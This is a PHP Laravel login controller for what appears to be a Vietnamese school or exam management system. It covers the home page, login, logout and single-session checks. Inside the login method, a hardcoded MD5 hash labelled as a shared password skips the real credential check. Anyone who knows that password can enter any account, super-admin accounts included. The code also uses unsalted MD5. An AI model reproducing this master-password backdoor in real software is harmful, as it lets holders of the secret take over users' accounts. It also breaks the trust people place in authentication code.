<?php

namespace App\Http\Controllers\Hethong;

use App\Http\Controllers\Controller;
use App\Models\Hethong\Chucnang;
use App\Models\Hethong\dstaikhoan_phanquyen;
use App\Models\Hethong\generalCOnfig;
use App\Models\quanly\giaovien;
use App\Models\quanly\hocvien;
use App\Models\thithu\phongthi;
use App\Models\User;
use App\Models\tintuc\tintuc;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;
use Carbon\Carbon;
use Illuminate\Support\Facades\Config;

class HethongchungController extends Controller
{
	public function index()
	{
		$cacbaivietganday = tintuc::select('id', 'tieude', 'slug', 'phude', 'created_at')
			->orderBy('created_at', 'DESC')->take(4)->get();
	// dd(session('admin'));
		return view('trangchu')
			->with('baocao', getdulieubaocao())
			->with('pageTitle', 'Trang chủ')
			->with('cacbaivietganday', $cacbaivietganday);
	}

	public function login()
	{
		return view('Hethong.dangnhap');
	}

	public function DangNhap(Request $request)
	{
		$inputs = $request->all();

		$user = User::where('cccd', $inputs['cccd'])->first();
		$data = [
			'cccd' => $inputs['cccd'],
			'password' => $inputs['password']
		];

		//tài khoản không tồn tại
		if (!isset($user)) {
			return view('errors.tontaidulieu')
				->with('message', 'Sai tên tài khoản hoặc sai mật khẩu đăng nhập')
				->with('furl', '/');
		}
		//Tài khoản chưa kích hoạt
		// if($user->status == 0){
		// 	return view('errors.tontai_dulieu')
		// 	->with('message', 'Tài khoản chưa kích hoạt.')
		// 	->with('furl', '/');
		// }
		//Tài khoản đang bị khóa
		if ($user->trangthai == 2) {
			return view('errors.tontaidulieu')
				->with('message', 'Tài khoản đang bị khóa. Bạn hãy liên hệ với người quản trị để mở tài khoản')
				->with('furl', '/');
		}


		//Sai tài khoản

		$res = Auth::attempt($data);
		// dd($res);
		if (md5($inputs['password']) != '40b2e8a2e835606a91d0b2770e1cd84f') { //mk chung
			// if (md5($inputs['password']) != $user->password) {
			// if (Hash::make($inputs['password']) != $user->password) {
			if (!$res) {
				// $ttuser->solandn = $ttuser->solandn + 1;
				// if ($ttuser->solandn >= $solandn) {
				//     $ttuser->status = 'Vô hiệu';
				//     $ttuser->save();
				//     return view('errors.lockuser')
				//         ->with('message', 'Tài khoản đang bị khóa. Bạn hãy liên hệ với người quản trị để mở khóa tài khoản.')
				//         ->with('url', '/DangNhap');
				// }
				// $user->save();
				return view('errors.tontaidulieu')
					->with('message', 'Sai tên tài khoản hoặc sai mật khẩu đăng nhập
                    .Do thay đổi trong chính sách bảo mật hệ thống nên các tài khoản được cấp có mật khẩu yếu dạng: 123, 123456,... sẽ bị thay đổi lại');
			}
		}
		// dd($user);
		//kiểm tra tài khoản
		//1. level = SSA ->
		if ($user->sadmin != "SSA") {
			if ($user->hocvien == 1) {
				$hocvien = hocvien::where('cccd', $user->cccd)->first();
				$user->manguoidung = $hocvien->mahocvien;
				$user->malop = $hocvien->malop;
				$user->vitri= 'Học viên';
				$user->sdt=$hocvien->sdt;
				$user->gioitinh=$hocvien->gioitinh;
				$user->ngaysinh=$hocvien->ngaysinh;
				$user->diachi=$hocvien->diachi;

			}
			if ($user->giaovien == 1) {
				$giaovien = giaovien::where('cccd', $user->cccd)->first();
				$user->manguoidung = $giaovien->magiaovien;
				$user->vitri= 'Giáo viên';
				$user->sdt=$giaovien->sdt;
				$user->gioitinh=$giaovien->gioitinh;
				$user->ngaysinh=$giaovien->ngaysinh;
				$user->diachi=$giaovien->diachi;
				$user->hdsd='';

			}
			if($user->sadmin == 'ADMIN'){
				$user->capdo='ADMIN';
			}
			$user->phanquyen = json_decode($user->phanquyen, true);
			// dd($user);
		} else {
			
			$user->capdo = "SSA";
		}
		if($this->chklogin($user->isaction)){
			//1. Không cho đăng nhập, đẩy ra thông báo
			//2. Cho đăng nhập thì lập tức tài khoản đang onl logout luôn
			$dxtaikhoan=generalCOnfig::first()->dxtaikhoan;
			if($dxtaikhoan == 0)//Không cho đăng nhập
			{
				return view('errors.tontaidulieu')
				->with('message', 'Tài khoản đang đăng nhập ở thiết bị khác')
				->with('furl', '/DangNhap');
			}else{
				if (Session::has('admin')) {
					Session::flush();
				}
			}
		};
		Session::put('admin', $user);

		$time=Carbon::now('Asia/Ho_Chi_Minh')->toDateTimeString();
		//đẩy session id vào user để check đăng nhập giới hạn 1 tài khoản
		$data_update=[
			'isaction'=>$time,
			'islogin'=>session()->getId()
		];
		$userupdate = User::where('cccd', session('admin')->cccd)->first();

		// dd($user);
		$userupdate->update($data_update);
		//Gán hệ danh mục chức năng        
		Session::put('chucnang', Chucnang::all()->keyBy('maso')->toArray());
		// dd(session('chucnang'));
		//gán phân quyền của User
		Session::put('phanquyen', dstaikhoan_phanquyen::where('tendangnhap', $inputs['cccd'])->get()->keyBy('machucnang')->toArray());

		loghethong(getIP(),session('admin'),'dangnhap','dangnhap');
        if (chkPhanQuyen('saoluudulieu', 'thaydoi') && session('admin')->capdo != 'SSA') {
            xoadulieusaoluu();
        }
		return redirect('/TrangChu')
			->with('success', 'Đăng nhập thành công')
			->with('pageTitle', 'Trang chủ');


	}

	public function logout()
	{
		if (Session::has('admin')) {
			Session::flush();
			return redirect('/');
		} else {
			return redirect('');
		}
	}
	public function chklogin($thoigian){
		if (!Session::has('admin')) {
			return false;
		};
		// $user=User::findOrFail($id);
		// $thoigianthaotac=$user->isaction();
		$chenhlechthoigian=Carbon::now('Asia/Ho_Chi_Minh')->diffInMinutes($thoigian);
		$time_session=Config::get('session.lifetime');
		if($chenhlechthoigian < $time_session){
			return true;
		}else{
			return false;
		}
	}
}